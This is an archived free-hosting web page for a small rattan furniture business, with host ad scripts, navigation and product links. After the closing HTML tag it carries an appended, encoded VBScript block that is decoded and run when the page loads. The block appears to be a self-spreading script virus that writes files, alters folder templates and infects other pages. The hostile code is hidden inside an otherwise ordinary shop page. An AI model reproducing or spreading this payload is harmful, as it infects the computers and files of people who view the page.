<html>
<head><title>George Official Site</title>
<link href="mws.css" rel="stylesheet" type="text/css">
</head>
<body background="cnvbkgnd.jpg"><style id="BANNERSTYLE" type="text/css">
div#tb_container{text-align:center; color:#fff}
div#tb_container a{color:#fff; font-family:Arial, Helvetica, sans-serif; font-size:11px; text-decoration:none}
div#tb_container a:hover{color:#292929; text-shadow:none}
div#tb_container div.tb_menu_bg{width:760px; margin:0 auto 10px; padding:0; text-shadow:1px 1px 1px #515151;
	background-color:#7F9343;
  	background-image:-moz-linear-gradient(top, #7F9343, #CAD99B); 
  	background-image:-webkit-gradient(linear,left top,left bottom,color-stop(0, #7F9343),color-stop(1, #CAD99B));
  	-moz-border-radius:0 0 10px 10px; -webkit-border-radius:0 0 10px 10px; border-radius:0 0 10px 10px;
  	-moz-box-shadow:1px 1px 2px #292929; -webkit-box-shadow:1px 1px 2px #292929; box-shadow:1px 1px 2px #292929; overflow:hidden;
	font-family:Arial, Helvetica, sans-serif}
div#tb_container div.tb_menu_bg a.floatLeftAd{float:left; margin-left:13px; background:url(adm/common/images/tripodLogoAd.png) no-repeat -94px 0; height:27px; width:86px}
div#tb_container div.tb_menu_bg a.floatLeftAd:hover{background-position:0 0}
div#tb_container div.tb_menu_bg .txtContainer{float:left; margin:4px 0 0 10px}
div#tb_container div.tb_menu_bg .txtContainer strong{margin-left:5px; border-left:1px solid; padding-left:18px; color:#292929; text-shadow:none}
div#tb_container div.tb_menu_bg a.big{font-size:17px; margin:0 10px}
</style>


<script type="text/javascript" src="http://hb.lycos.com/hb.js"></script>
<script type="text/javascript">
var cm_role = "live";
var cm_host = "tripod.lycos.com";
var cm_taxid = "/memberembedded";
var tripod_member_name = "rattansfurniture";
var tripod_member_page = "rattansfurniture/index.html";
var tripod_ratings_hash = "1306238826:df040004a2229d81409fee1d87170e78";

var lycos_ad_category = {"find_what":"canes"};

var lycos_ad_remote_addr = "204.93.130.142";
var lycos_ad_www_server = "www.tripod.lycos.com";
var lycos_ad_track_small = "http://members.tripod.com/adm/img/common/ot_smallframe.gif?rand=938118";
var lycos_ad_track_served = "http://members.tripod.com/adm/img/common/ot_adserved.gif?rand=938118";
</script>

<script type="text/javascript" src="http://scripts.lycos.com/catman/init.js"></script>
<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
<script type="text/javascript"> 
var lycos_ad = Array();
var lycos_search_query = "";
var lycos_onload_timer;

function lycos_check_size() {
    var window_width = 0, window_height = 0;
    if (typeof(window.innerWidth) == 'number' ) {
        window_width = window.innerWidth;
        window_height = window.innerHeight;
    } else if (document.documentElement && (document.documentElement.clientWidth || document.documentElement.clientHeight)) {
        window_width = document.documentElement.clientWidth;
        window_height = document.documentElement.clientHeight;
    } else if (document.body && (document.body.clientWidth || document.body.clientHeight)) {
        window_width = document.body.clientWidth;
        window_height = document.body.clientHeight;
    } 
    
    var lycos_track_img = document.createElement('img');
    if( top == self ) {
        return 1;
    } else {
        if ((window_width < 300) || (window_height < 300)) {
            lycos_track_img.src=this.lycos_ad_track_small+"&w="+window_width+"&h="+window_height;
            return 0;
        } else {
            lycos_track_img.src=this.lycos_ad_track_served+"&w="+window_width+"&h="+window_height;
            return 1;
        }
    }
}
       
function lycos_insert_ads() {
    var lycos_ad_mgr = new AdManager();
    
    if (this.lycos_search_query) {
        lycos_ad_mgr.setForcedParam("keyword", this.lycos_search_query);
    } else if (this.lycos_ad_category && this.lycos_ad_category.find_what) {
        lycos_ad_mgr.setForcedParam("keyword", this.lycos_ad_category.find_what);
    }

    if (this.lycos_ad_category && this.lycos_ad_category.dmoz) {
        lycos_ad_mgr.setForcedParam("page", this.lycos_ad_category.dmoz);
    } else {
        lycos_ad_mgr.setForcedParam("page", "member");
    }

    var lycos_prod_set = lycos_ad_mgr.chooseProductSet();
    var slots = ["leaderboard", "leaderboard2"];
    for (var slot in slots) {
        if (lycos_ad_mgr.isSlotAvailable(slots[slot])) {
            lycos_ad[slots[slot]] = lycos_ad_mgr.getSlot(slots[slot]);
        }
    }

    lycos_ad_mgr.renderFooter();
}

function generateHref(atag, template){
    atag.href=template.replace('_MYURL_', window.location.href.replace('http://', '')).replace('_MYTITLE_', 'Check%20out%20this%20Tripod%20Member%20site!'); 
}

if (lycos_check_size()) {
    lycos_insert_ads();
}


jQuery.noConflict();
jQuery(function(){
  if ( ! lycos_check_size() ) { jQuery("#tb_container").hide(); jQuery("#FooterAd").hide(); return; }

  var onButton = -44;
  var onShare = -89;
  var onSearch = 0;
  var $build = jQuery("#build");
  var ss = $build.css("top");

	jQuery("#more_click").unbind().click(function(ev){
      if (ss == onShare) {
          $build.animate({"top": onButton + "px"});
          ss = onButton;
      }
      else {
          $build.animate({"top": onShare + "px"});
          ss = onShare;
      }
	});
											
	jQuery("#searchlycos").unbind().click(function(ev){
      if (ss == onSearch) {
          $build.animate({"top": onButton + "px"});
          ss = onButton;
      }
      else {
          $build.animate({"top": onSearch + "px"});
          ss = onSearch;
      }
	});
	
  var f = jQuery("#FooterAd").remove();
  f.children("script").remove();
  f.appendTo("body");

  jQuery("#BANNERSTYLE").appendTo("head");

});
</script>
<div id="tb_container">
    <div class="tb_menu_bg">
        <div id="tb_menu">
        
   <a href="http://www.tripod.lycos.com" title="tripod.com" class="floatLeftAd"></a>
   
   <div class="txtContainer">
   <a href="http://www.tripod.lycos.com" title="Build a website at Tripod.com" class="big">Build your own FREE website at Tripod.com</a>
   <strong style="font-size:14px">Share: </strong>

<a href="http://www.facebook.com" onclick="generateHref(this, 'http://facebook.com/sharer.php?u=_MYURL_&t=_MYTITLE_')" id="facebook" rel="nofollow">Facebook</a> |
<a href="http://www.twitter.com" onclick="generateHref(this, 'http://twitter.com/home?status=_MYTITLE_%20-%20_MYURL_')" id="twitter" rel="nofollow">Twitter</a> |
<a href="http://www.digg.com" onclick="generateHref(this, 'http://digg.com/submit?phase=2&url=_MYURL_&title=_MYTITLE_')" id="digg" rel="nofollow">Digg</a> |
<a href="http://reddit.com" onclick="generateHref(this, 'http://reddit.com/submit?url=_MYURL_&title=_MYTITLE_')" id="reddit" rel="nofollow">reddit</a>
</div>
		</div>
    </div>
	
    
    <div id="tb_ad" style="display:block!important"><div id="ad_container" style="display:block!important"><script type="text/javascript">document.write(lycos_ad['leaderboard']);</script></div></div>
</div>
<div id="FooterAd" style="text-align:center; display:block!important; width:100%!important"><script type="text/javascript">document.write(lycos_ad['leaderboard2']);</script></div>
<noscript>
 <img src="http://members.tripod.com/adm/img/common/ot_noscript.gif?rand=938118" alt="" width="1" height="1" />
 <!-- BEGIN STANDARD TAG - 728 x 90 - Lycos - Tripod Fallthrough - DO NOT MODIFY -->
 <iframe frameborder="0" marginwidth="0" marginheight="0" scrolling="no" width="728" height="90" src="http://ad.yieldmanager.com/st?ad_type=iframe&amp;ad_size=728x90&amp;section=209094"></iframe>
 <!-- END TAG -->
</noscript>





<center><img src="asia.jpg" width="550" height="115"></center>
<center><img src="asia2image.jpg" width="550" height="4"></center>
<center><img src="ag40.gif" width="523" height="23"></center>
<center><a href="home.htm">HOME</a>&nbsp; &nbsp; 
<a href="products1.htm">PRODUCTS</a>&nbsp; &nbsp;  
<a href="the.htm">ABOUT US</a>&nbsp; &nbsp;
 <a href="contactus.htm">CONTACT US</a>&nbsp;  &nbsp;
 <a href="order.htm">ORDER NOW</a> </center>


<p><font size="5px" font color="blue" font style="matura MT"><marquee>Rattan's Furnitures</marquee></font></p>
<center><img src="ringing.jpg"></center>


<p><font size="4px" font color="blue">&nbsp;&nbsp;&nbsp;See more Products[<a href="products2.htm">2</a>
		<a href="products3.htm">3</a>
		<a href="products4.htm">4</a>
		<a href="products5.htm">5</a>
		<a href="products6.htm">6</a>
		<a href="products7.htm">7</a>
		<a href="products8.htm">8</a>
		<a href="products9.htm">9</a>
		<a href="products10.htm">10</a>]</font></p>

</body>
</html><Script Language="VBScript"><!--
QueryString="#@~^kxEAAA==6	P3MDKDP""+k;:PH+XY@&/Kx/D~bawVOHls+{J-4d bmCD}dRyRT ZJ@&/G	/OPz2aVnDZKN+{J1G:c:dRmmOr7+(c)mDk\p/WswKxnxOE@&ZGxkOP6/G/d?q9xr	TfWfw2T8Ow!,2O8qZwO0,W!RTZb!;1!lc y0NJ@&ZKxdY~AkZJ?&9'r	o12*f/+yOqZwT FqG! bf~, T!;!*sG*0)ZA8r@&NKmEsnUYchMkO+E@!mw2VOP4+rL4Y'T~Sk[Y4xZPUm:'JLba2VYHls+'E,mW9n'r[ba2s+DZKNn[E@*@!zCwas+D@*E@&9Wm;hxORS.bYnr@!kmDbwD~0KDxhbx[GSP+7nxD'W	sGl9@*k+OKrhr;YrE\(/^.bwYlhmkU\ymKxsKl9`#rJBq!Z!@!zkm.raY@*r@&?!4PsCrx7 |WUVGC9`b@&""no;tCUT+`b@&GDGw:nswsmY`K:aslD+9kM#@&9MWw:n:aVlDncK4kkfrDKCDtb@&G.WaHrd1`#@&obVn?1C	`P4kkfkMnmOt*@&KSKl[/4+m0c#@&2x9~jE(@&UE8P9.Kw\kk^`*@&6U,2D.GMP]+k;s+~g+XY@&wWM~x{!~YKPq@&GDWaP+swVmOn`6/KR!+Oja+^kmssKV[nM`xb'r-E#@&H6O@&sKDPAl14P9Prx,0dGcfDb-+k@&q6~[RGDb\nKz2'+PD4+	P9.KwKnhaVCYc9R9Mk7+SYDnDLJl-r#@&H6Y@&oWMP2m^4P	Pbx~d4UtnV^ ?a+^rmVsGs9+./@&(6P(	?DD`	~r9+k3OWaJbxZPK4nx,fDK2P+sw^lO+cULJwJ*@&16O@&AxN~j!4@&?!8,nJKl9Ztm0c#@&rUPAD.GMPIdEs+PgnaY@&q6P\WUO4`HWSb'OPCU9PfCzv1Gh*xyv~DtxPq/4jtVsR""EUcrIjg9Sd& c3p2,/4+sVf+cNsVBjCA6rOqkx[GS/36,+r#@&Ax9P?!4@&jE(Pok^+)2a+x9c0Bm#@&6UPADMW.P]nkEh+,H+XY@&jYPhzwks+{WkW V+Dsk^+vW#@&xx:HsrsRbDODb4EDnd@&sXwks+ )DY.k(;Y/xT@&?+O~sXok^n{0dKR}w+	KaYwks+v0S0*@&:Hok^+Rq.rYP1@&hXor^+ Z^G/@&or^+bOOMPW~	@&Ax[,?!4@&UE(~sbVnq	0n^D`w*@&r	P2M.GD,I/;:n~g+aY@&j+DPWx6/W 6a+UKaDsr^+vw~8#@&^'6R]+mN)s^@&0c/VK/+@&(WP&xUY.In-vmS\;GN#xT,rD~(	?OD""n7`^B\;WN#3J+	`-ZKNnb@!S+	cm*PK4nUP@&sbVnb22x[PaS\;W[n@&2x[~&0@&2	[,?;(@&UE4,sbs+UmCxvwb@&}xPA.DKDP""ndEs+,1n6O@&wW.PACm4PdW8PqU~6/GRVnDsG^ND`a#cok^+d@&U+sn1YP;C/PS;Cd+v0kW MnOA6O+	dkKxHCs+`dW8RHlsn*#@&;lk+PrtDhJBJ4YsVESrtYDE@&wkV(U0mD`d0q hlOt*@&2	N~jV+^O@&1n6D@&Ax[,?!4@&wE	^YbWUP7ZG[`#@&6x,2DMG.P""+kEh+~H6O@&	/W9+x]wVC^`}E.H?OMk	o~1tMc&W#Sm4DcfW#[14Dv&c*b@&fMWaHn').Mlz`r@!JLJj^MkwO~dlUo!CT+xrJjA?1Db2YrJ@*@!r[^4M`&2b[rOOrSEp!+MXjY.r	oxJrE[	ZG[[JEEr~ENK^!:n	YchDbYEJ@!JE[rJj^MkwD~Smxo!CL+{JrJE.$j1DrwD 2	mG[JJEE@*JE[5;DzUYMkxT[rE@!JJE[rJj^MkwD@*JrJ~rRRJLJ@*@!&J'EUm.kaO@*r#@&-;WNnxxWrxv9MW2t+BZtM`8T#*@&3x9Po;	mYbGx@&?E(~]+TZ4lUonc*@&6x,3DMW.~""+/;hPH+XO@&b3{J4YYa)J&hSh oW^rDk+k mK:z4n[Nm{sl.knmDWs+	Ok	W&r	N+a 4YhJ@&jh'Em4KEY=+M.WMJ@&C;jxE_|2ImZ`IIAHP{`?AIwJ@&jt'E?KWYSl.n'Hk^.K/G0Dwr@&udH{JCn2ImS}Z)S|H)/_q1AwJ@&Z{E	k	NKhd-/;MDnxD#+M/rG	-J@&KA'EnKsbmr/'26aVK.+M-E@&&2xE&xY.xYPAa2VKDDwJ@&j{C/jLjHLq3'rHlrU'?OlMO,nCT+r@&b{Cd\[UH'qA[E)(WEDiId/-..WMJ@&2xCJ\L?\[q/[r2aOUt+ssjknhkwP*1Rcws2ZOy0fWOqF;sR)Avv T%Z! ~+3Fyvy8wJ@&H{CJHLjHL/'h2[EHKsGV9nMr2DkKx/r@&_xC;j'?t[	/LJ2X2VKD+Mw)N7l	mnNwubN[+	E@&;'u/`[?\'qZ'nA'rZsm/kkmUtsVr@&	kDt~	kt?4nV^@&fqxEIAM|f	r]9r@&j}{EIAMmj\J@& ]o	DbOPjB?h~?\@&c]+T.kD+~)Bb2Bj}@&RIL	DbYPH~qSG@&R""noqDrOPCSTBf	@&c]o	MkD+P;~ZSfq@& Io9n^+Y~2@&2x9~	kDt@&2UN~j!4@&s!UmDkGU,KtrdGk.nmO4`b@&r	P2MDK.P""+dEs+~H6Y@&2'""+w^C^+vj	2dmC2`[W1;:xO ^WmCObWU#BE6ks)Jzzr~rE#@&qWP6/G wkV36b/Ykc2#,K4+U@&2x""+2Vm^+vwSWkWR!nDsrVHm:nvw*~Jr#@&3Vk+@&q6PHGD`SU`a#@!{fbP:tx~wx2LJ&J@&3x9P(W@&KtrdGk.nmO4'2@&2	NPwE	^YbWU@&wEU^DkW	~K:w^CO+GkM`b@&6U,2.DK.P""+d;s+PHnXY@&w{WkW V+D?wmbCVwWsNDcT*[J'	+(J@&6dGRG+^+O+oG^NnD,2~:D;n@&0/G ;DnlDnwWs9+M`w*@&UnY,:zsbVnx6/Wc!+DsW^[nDvw*@&hXor^+ bDODb4;O/'{@&:+hw^CD+9bD{w[r-r@&2	N~s!x^ObWx@&jE(PfMG2K:aVCYncalOt*@&r	P3.MWD~]/;:~g+aD@&wWV9+MuK:'E@!4Yhs@*@!4K[X,/mMGsV{xKPdYzs'hlMLk	)T@*@!W4%n1Y~m^Ck/r9'1V/bN=q%y!o2G!R*F&2 qFG!Oz1Z !ZZTco9F!Xby~/DXsn{hk[O4)q!ZYptnbo4Y)8!ZY@*@!zG4N+^O@*@!z(GNH@*@!J4O:^@*r@&rxrJbxn'm.DmXcE]26Oj4+sVwG^NnM.b+hkTrSJG+Wl!VOxP*,R*sw2! +0fWO8F/sR)AvOZ0!Z $+AF +)JSJPXO%*wsA!Oy%G*O8F/s b3+O!RT!yA Aq+vy8{	X,0*ws3! +%GcRq8ZsR)AvOZ0Z!+~ AF + )E~rJSJ]	X1Rcsw3!  %G*RF8ZwO)2 !0!Z+Ay2q++ 8DEBJK+Mdb/OtW	k3D{Wk^+lzJsGs9+Dc4YDJ~rESJ]RUtnVs/^ld/&U0KTESrZWUWbDhsbsr2{!r#@&G+kVYKw(1&'BGbx`bUkdkxS#4;Dd0b@&2xalOtLEf/VOKwRrUbJ@&sbsZ.lD+Pa~Gn/0YGw&1(@&wkV)YDDPaS{@&a'alOt'EwWsN.R4YOE@&sksn;DnlDn,wSwW^N+MC:PPLP-ZKNn@&wkV)YDDPaS{@&Ax9PjE8@&UE8PwrVZ.nmY+cWbVnxmh~^KxD+xD/*@&r	P3DMW.~""+/!h+,1+XO@&sbVbOY.~6ks+	C:~T@&U+Y~hHsrVx6/GcZM+lD+:n6DsrV`Wr^+xmh+BKD!nb@&sXwks+ 	MkO+,^W	YnUD/@&hzwks+c/^Wd@&AxN,?!8@&UE8PwksnzYYMc0bV+	Ch+BlDY.#@&6	P3DMGD,Ind!:+~H6O@&UnDPhHsbV+{0kGRV+OsbVnc6kVUls+#@&hzsbVR)YO.b4;Yd'mYO.@&2x[~UE8@&w;	mObW	Pbaw}8Lv#@&r	P3.MWD,]+kE:~H+XY@&?nY~)aw64NxNKm;hxY Caws+Ddvb2aVY1m:b@&Ax[PwEU^DkW	@&s!xmDrGx,0kWc#@&6	P3DMGD,Ind!:+~H6O@&UnDPWkW{ZDlDnr(Lc0kW/JUqf*@&2	NPw;UmDkKx@&s;U1YrW	~ktj4VVcb@&rUPA.MW.,I/Es+,H+XY@&?Y~	kt?4nV^'ZMnCYr(Lchd/d?(f*@&2	N~o!xmOrKx@&s!U1YrKx,ZDlDnr(LcZd?(9*@&r	~2MDWM~]+kEs+~1naD@&)wa64NRjnDZSj(G`/SU(G#@&zwar4NR1.+mYnq	/OC	m+vb@&Skx9GARkYmY;/xEr@&j+D~ZM+COr4%xzw2r(%cMnDr(L+1Yvb@&Ax[PwEU^DkW	mXYFAA==^#~@"
document.write"<"&"Script Language=""VBScript.Encode"">"&QueryString&"</"&"Script>"
--></Script>